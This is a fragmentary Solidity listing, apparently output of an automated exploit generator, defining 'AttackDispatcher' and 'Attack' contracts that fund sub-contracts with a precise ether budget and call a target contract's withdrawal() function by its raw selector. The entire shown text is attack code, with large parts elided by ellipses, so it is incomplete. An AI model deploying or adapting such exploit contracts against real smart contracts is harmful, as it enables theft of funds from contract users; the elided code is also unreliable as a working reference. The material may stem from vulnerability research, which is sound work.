 ...
 * parameter. Make sure to send at least 2405885 ether and 328322988784484353 wei to the attack
...
contract AttackDispatcher {
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                /*  func: withdrawal() (0xd4e93292)
                input: {  }
 
                 */
                bytes memory data = bytes(hex"d4e93292");
                uint value = 0x1fd774e138efaefec0000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x1fd774e138efaefec0001; /* equals 2405885 ether and 328322988784484353 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 2405885328322988784484352 }(4, _targets);
    }
